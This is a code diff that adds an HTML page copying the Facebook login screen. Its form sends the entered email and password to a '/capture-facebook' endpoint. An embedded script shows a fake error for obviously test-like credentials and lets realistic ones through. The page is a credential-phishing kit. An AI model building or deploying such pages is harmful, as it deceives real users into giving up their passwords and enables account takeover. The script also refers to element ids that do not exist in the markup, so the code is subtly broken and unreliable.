@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+      min-height: 100vh;
+    }
+
+    .left-section {
+      flex: 1;
+      max-width: 580px;
+      padding-right: 60px;
+    }
+
+    .left-section h1 {
+      color: #1877f2;
+      font-size: 60px;
+      margin-bottom: 10px;
+    }
+
+    .left-section p {
+      font-size: 24px;
+      color: #1c1e21;
+    }
+
+    .right-section {
+      flex: 1;
+      max-width: 400px;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .right-section input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      background-color: #f5f6f7;
+    }
+
+    .right-section button.login-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .right-section .forgot {
+      display: block;
+      text-align: center;
+      margin: 16px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .right-section hr {
+      border: none;
+      height: 1px;
+      background-color: #dadde1;
+      margin: 20px 0;
+    }
+
+    .right-section button.create-btn {
+      background-color: #42b72a;
+      color: white;
+      font-size: 17px;
+      padding: 12px 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .page-create {
+      text-align: center;
+      margin-top: 28px;
+      font-size: 14px;
+    }
+
+    .page-create a {
+      font-weight: bold;
+      text-decoration: none;
+      color: #1c1e21;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .left-section, .right-section {
+        max-width: 100%;
+        padding: 0;
+      }
+
+      .left-section {
+        text-align: center;
+        margin-bottom: 40px;
+      }
+
+      .left-section h1 {
+        font-size: 48px;
+      }
+
+      .left-section p {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left-section">
+      <h1>facebook</h1>
+      <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+    <div class="right-section">
+      <form method="POST" action="/capture-facebook">
+        <input type="text" name="email" placeholder="Email address or phone number" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit" class="login-btn">Log in</button>
+        <a href="#" class="forgot">Forgotten password?</a>
+        <hr />
+        <button type="button" class="create-btn">Create new account</button>
+      </form>
+      <div class="page-create">
+        <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+      </div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        const email = document.querySelector('input[name="email"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+        
+        // Show loading overlay
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        
+        // Simulate Facebook's behavior - show error for obviously fake credentials
+        if (password.length < 3 || email === 'test@test.com' || password === '123') {
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                alert('Sorry, something went wrong. Please try again.');
+                e.preventDefault();
+                return false;
+            }, 2000);
+        } else {
+            // Allow the form to submit normally for "realistic" credentials
+            setTimeout(() => {
+                // Form will submit normally
+            }, 1500);
+        }
+    });
+    </script>
+    
+</body>
+</html>
